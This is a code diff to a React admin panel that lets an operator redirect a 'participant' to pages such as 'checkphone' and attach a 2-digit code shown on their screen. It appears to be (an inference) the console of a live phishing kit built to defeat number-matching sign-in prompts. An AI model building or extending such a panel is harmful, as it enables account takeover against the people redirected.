@@ -1069,6 +1069,11 @@ function ParticipantCard({
   useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
   type PanelKey = "redirect" | "submitted";
   const [panels, setPanels] = useState<Set<PanelKey>>(() => new Set());
+  const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);
+  const [pickedPage, setPickedPage] = useState<Page | null>(null);
+  const [codeDraft, setCodeDraft] = useState("");
+  const [awaitingCodeFor, setAwaitingCodeFor] = useState<Page | null>(null);
+
   function togglePanel(k: PanelKey) {
     setPanels((prev) => {
       const next = new Set(prev);
@@ -1084,10 +1089,18 @@ function ParticipantCard({
       next.delete(k);
       return next;
     });
-    if (k === "redirect") setTimeout(() => { setPickedSuite(null); setPickedPage(null); }, 200);
+    if (k === "redirect") setTimeout(() => {
+      setPickedSuite(null);
+      setPickedPage(null);
+      setAwaitingCodeFor(null);
+      setCodeDraft("");
+    }, 200);
   }
-  const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);
-  const [pickedPage, setPickedPage] = useState<Page | null>(null);
+
+  /** Pages that require a 2-digit code when redirecting (shown on participant page). */
+  const CODE_PAGES: Record<string, string[]> = {
+    ge: ["checkphone"],
+  };
 
   const PAGE_VARIANTS: Record<string, Record<string, { value: string; label: string }[]>> = {
     cb: {
@@ -1105,8 +1118,28 @@ function ParticipantCard({
     [pickedSuite, regRev],
   );
 
+  function pageBase(page: Page): string {
+    return page.split("?")[0] ?? page;
+  }
+
   function routeTo(suite: Suite, page: Page) {
+    if (CODE_PAGES[suite]?.includes(pageBase(page))) {
+      setAwaitingCodeFor(page);
+      setCodeDraft("");
+      return;
+    }
     onNavigate(p.id, suite, page);
+    closePanelKey("redirect");
+  }
+
+  function confirmCodeRedirect() {
+    if (!pickedSuite || !awaitingCodeFor) return;
+    const digits = codeDraft.replace(/\D/g, "").slice(0, 2);
+    if (digits.length !== 2) return;
+    const base = pageBase(awaitingCodeFor);
+    onNavigate(p.id, pickedSuite, `${base}?code=${digits}`);
+    setAwaitingCodeFor(null);
+    setCodeDraft("");
     closePanelKey("redirect");
   }
 
@@ -1251,6 +1284,45 @@ function ParticipantCard({
                   );
                 })}
               </div>
+            ) : awaitingCodeFor ? (
+              <>
+                <button
+                  className="admin-redirect-back"
+                  onClick={() => {
+                    setAwaitingCodeFor(null);
+                    setCodeDraft("");
+                  }}
+                >
+                  ← Pages
+                </button>
+                <div className="admin-redirect-code">
+                  <p className="admin-redirect-code-label">
+                    Enter a 2-digit code to show on their screen
+                  </p>
+                  <input
+                    className="admin-redirect-code-input"
+                    type="text"
+                    inputMode="numeric"
+                    autoComplete="one-time-code"
+                    maxLength={2}
+                    placeholder="00"
+                    value={codeDraft}
+                    autoFocus
+                    onChange={(e) => setCodeDraft(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                    onKeyDown={(e) => {
+                      if (e.key === "Enter") confirmCodeRedirect();
+                    }}
+                  />
+                  <button
+                    type="button"
+                    className="admin-redirect-code-go"
+                    disabled={codeDraft.replace(/\D/g, "").length !== 2}
+                    onClick={confirmCodeRedirect}
+                  >
+                    Send with code
+                  </button>
+                </div>
+              </>
             ) : pickedPage && PAGE_VARIANTS[pickedSuite]?.[pickedPage] ? (
               <>
                 <button className="admin-redirect-back" onClick={() => setPickedPage(null)}>
